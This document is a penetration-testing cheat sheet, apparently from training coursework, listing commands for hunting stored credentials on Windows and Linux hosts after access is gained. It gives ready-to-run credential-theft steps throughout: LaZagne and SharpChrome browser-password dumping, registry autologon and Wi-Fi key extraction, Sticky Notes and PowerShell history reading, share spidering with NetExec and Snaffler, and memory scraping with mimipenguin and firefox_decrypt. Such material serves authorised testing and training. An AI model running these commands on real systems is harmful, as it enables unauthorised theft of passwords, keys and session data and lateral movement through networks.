# Credential Hunting 

**Here we will look at various ways of searching for passwords in both Windows and Linux environments.**

## Windows

Once we have access to a target Windows machine through the GUI or CLI, incorporating credential hunting into our approach can provide significant advantages. Credential hunting is the process of performing detailed searches across the file system and through various applications to discover credentials.

Key terms to search for:
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials
- Look for keywords within files such as passw, user, token, key, and secret.
- Search for files with extensions commonly associated with stored credentials, such as .ini, .cfg, .env, .xlsx, .ps1, and .bat.
- Watch for files with "interesting" names that include terms like config, user, passw, cred, or initial.

**Windows Search to find files**

**LaZagne**
````
> LaZagne.exe all
````

**BrowserCreds**
````
> .\SharpChrome.exe logins /unprotect
https://github.com/hakaioffsec/browservoyage
````

**SessionGopher**
````
> Import-Module .\SessionGopher.ps1
> Invoke-SessionGopher -Target <machine>
````

**Autologon**
````
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
````

**findstr & Powershell**
````
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
> findstr /SI /M "password" *.xml *.ini *.txt
> findstr /si password *.xml *.ini *.txt *.config
> findstr /spin "password" *.*
> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password (powershell)
> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore (powershell)
````

**Misc**
````
> gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
> gc (Get-PSReadLineOption).HistorySavePath
> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
````

**unattend.xml**

**StickyNotes**
````
Located at C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
Copy the plum.sqlite to our machine
Open with DB Browser for SQLite
---------------------------------------------------------------------------------------------------------------------
- Viewing Sticky Notes Data Using PowerShell -
> Set-ExecutionPolicy Bypass -Scope Process
> Import-Module .\PSSQLite.psd1
> $db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
````

**Wifi Passwords**
````
> netsh wlan show profile
> netsh wlan show profile <wifi_network> key=clear
````

**Snaffler**
````
c:\Users\Public>Snaffler.exe -s
````

**PowerHuntShares**
````
# Bypass execution policy restrictions
> Set-ExecutionPolicy -Scope Process Bypass
# Import module that exists in the current directory
> Import-Module .\PowerHuntShares.psm1
> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
````

**Netexec**
````
$ nxc smb <IP> -u <user> -p '<password>' --spider <share> --content --pattern "passw"
$ nxc smb <IP> -u '<user>' -p '<password>' --shares -M spider_plus -o DOWNLOAD_FLAG=True (Dwonload all files)
$ nxc smb <ip> -u user -p pass -M keepass_discover
$ nxc smb <ip> -u <user>  -p <password> -M putty
$ nxc smb <ip> -u <user>  -p <password> -M vnc
$ nxc smb <ip> -u <user>  -p <password> -M mremoteng
$ nxc smb <ip> -u username -p password -M notepad
$ nxc smb <ip> -u username -p password -M notepad++
````

MANSPIDER
````
https://github.com/blacklanternsecurity/MANSPIDER
$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <IP> -c 'passw' -u '<user>' -p '<password>'
````

## Linux

There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

- Files including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- History including logs, and command-line history
- Memory including cache, and in-memory processing
- Key-rings such as browser stored credentials

**Files**
````
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
$ find / -name "*.kdbx" 2>/dev/null
$ find / \( -name "*.kdbx" -o -name "*.kdb" -o -iname "*keepass*" \) 2>/dev/null
$ find / -name "*.psafe3" 2>/dev/null
$ find / \( -name "*.kdbx" -o -name "*.kdb" -o -name "*.psafe3" -o -iname "*keepass*" -o -iname "*pwsafe*" -o -iname "*passwordsafe*" \) 2>/dev/null
$ grep 'DB_USER\|DB_PASSWORD' wp-config.php
$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
````

**Cronjobs**
````
$ cat /etc/crontab
$ ls -la /etc/cron.*/
````

**History Files**
````
$ cat /home/*/.bash*
$ cat .bash_history
````

**Log Files**
````
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
````

**Memory and cache**
````
https://github.com/huntergregal/mimipenguin (Need Root Permissions)
$ sudo python3 mimipenguin.py
$ sudo python2.7 laZagne.py all
````

**Browser credentials**
````
https://github.com/unode/firefox_decrypt
$ python3.9 firefox_decrypt.py
````

